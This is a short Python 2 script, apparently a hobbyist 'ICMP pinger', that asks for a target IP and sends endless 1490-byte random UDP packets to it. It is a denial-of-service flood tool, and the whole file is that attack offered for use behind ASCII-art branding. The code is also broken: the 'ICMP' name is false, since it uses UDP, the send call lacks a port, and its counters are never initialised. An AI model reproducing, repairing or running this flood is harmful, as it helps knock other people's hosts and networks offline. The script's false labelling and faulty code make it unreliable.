#Feel free to look at all of the code
#More updates later

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet ICMP P1NGER")
print
print("$$$$$$$\   $$\                                       ")
print("$$  __$$\$$$$ |                                      ")
print("$$ |  $$ \_$$ | $$$$$$$\  $$$$$$\  $$$$$$\  $$$$$$\  ")
print("$$$$$$$  | $$ | $$  __$$\$$  __$$\$$  __$$\$$  __$$\ ")
print("$$  ____/  $$ | $$ |  $$ $$ /  $$ $$$$$$$$ $$ |  \__|")
print("$$ |       $$ | $$ |  $$ $$ |  $$ $$   ____$$ |      ")
print("$$ |     $$$$$$\$$ |  $$ \$$$$$$$ \$$$$$$$\$$ |      ")
print("\__|     \______\__|  \__|\____$$ |\_______\__|      ")
print("                         $$\   $$ |                  ")
print("                         \$$$$$$  |                  ")
print("                          \______/                   ")
print("Thanks for using my custom pinger!")
print"By DeaKenas"
print
ip = raw_input(" Target : ")

os.system("clear")
os.system("figlet ICMP P1NGER")
while True:
     sock.sendto(bytes, ip)
     sent = sent + 1
     port = port + 1
     print "P1NGED %s packets to %s with ICMP"%(sent,ip)
